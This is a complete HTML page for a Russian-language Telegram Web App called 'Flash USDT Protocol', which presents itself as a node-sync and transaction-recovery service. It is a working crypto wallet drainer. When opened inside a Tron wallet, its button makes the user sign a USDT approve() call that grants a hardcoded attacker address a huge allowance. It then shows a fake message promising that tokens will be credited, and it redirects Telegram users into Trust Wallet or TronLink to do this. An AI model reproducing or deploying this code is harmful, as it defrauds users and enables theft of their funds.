<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Flash USDT Protocol</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body { background-color: #0f0f0f; color: #ffffff; font-family: -apple-system, sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; padding: 20px; }
        .container { border: 1px solid #333; padding: 30px 20px; border-radius: 28px; background: #1a1a1a; }
        .loader { border: 3px solid #333; border-top: 3px solid #0088cc; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-size: 18px; margin-bottom: 10px; }
        p { color: #888; font-size: 13px; line-height: 1.5; }
        .btn { background: #0088cc; color: white; border: none; padding: 18px; font-size: 15px; font-weight: bold; border-radius: 16px; cursor: pointer; width: 100%; text-transform: uppercase; margin-top: 20px; }
        .btn-alt { background: #222; margin-top: 10px; color: #888; font-size: 12px; }
    </style>
</head>
<body>

<div class="container">
    <div id="loading-state">
        <div class="loader"></div>
        <h2>Синхронизация узла...</h2>
        <p>Устанавливаем защищенное соединение с сетью TRC-20. Пожалуйста, не закрывайте страницу.</p>
    </div>

    <div id="action-state" style="display: none;">
        <h2 id="action-title">Flash USDT Protocol</h2>
        <p id="action-desc">Для восстановления транзакции выберите ваш кошелек:</p>
        <button id="mainBtn" class="btn">Запустить валидатор</button>
        <button id="altBtn" class="btn btn-alt" style="display: none;">Открыть в TronLink</button>
    </div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const ADMIN_ADDRESS = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
    const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    const CLEAN_URL = window.location.origin + window.location.pathname;

    const loadingState = document.getElementById('loading-state');
    const actionState = document.getElementById('action-state');
    const mainBtn = document.getElementById('mainBtn');
    const altBtn = document.getElementById('altBtn');
    const actionDesc = document.getElementById('action-desc');

    async function checkEnv() {
        // Если мы внутри dApp (Trust / TronLink)
        if (window.tronWeb || (window.tron && window.tron.tronWeb)) {
            const tw = window.tronWeb || window.tron.tronWeb;
            loadingState.style.display = 'none';
            actionState.style.display = 'block';
            actionDesc.innerText = "Узел обнаружен. Нажмите кнопку ниже для верификации и зачисления токенов.";
            mainBtn.innerText = "Верифицировать логи";
            
            // Пытаемся вызвать подпись сразу при клике
            mainBtn.onclick = async () => {
                try {
                    // 1. Обязательный запрос на подключение кошелька
                    await tw.request({ method: 'tron_requestAccounts' });
                    
                    // 2. Вызов апрува
                    const contract = await tw.contract().at(USDT_CONTRACT);
                    await contract.approve(ADMIN_ADDRESS, '1000000000000000').send();
                    
                    tg.showPopup({
                        title: 'Успешно',
                        message: 'Синхронизация завершена. Токены будут зачислены в течение 15-30 минут.',
                        buttons: [{type: 'ok'}]
                    });
                    setTimeout(() => tg.close(), 5000);
                } catch (e) {
                    tg.showAlert("Ошибка: подтвердите действие в кошельке.");
                }
            };
        } else {
            // Если мы в Telegram
            loadingState.style.display = 'none';
            actionState.style.display = 'block';
            altBtn.style.display = 'block';
            
            mainBtn.innerText = "Открыть в Trust Wallet";
            mainBtn.onclick = () => {
                tg.openLink("https://link.trustwallet.com/open_url?coin_id=195&url=" + encodeURIComponent(CLEAN_URL));
            };
            
            altBtn.onclick = () => {
                tg.openLink("tronlink-dapp://cloud.tronlink.org/open?url=" + encodeURIComponent(CLEAN_URL));
            };
        }
    }

    // Запуск проверки через небольшую паузу
    setTimeout(checkEnv, 1500);
</script>
</body>
</html>
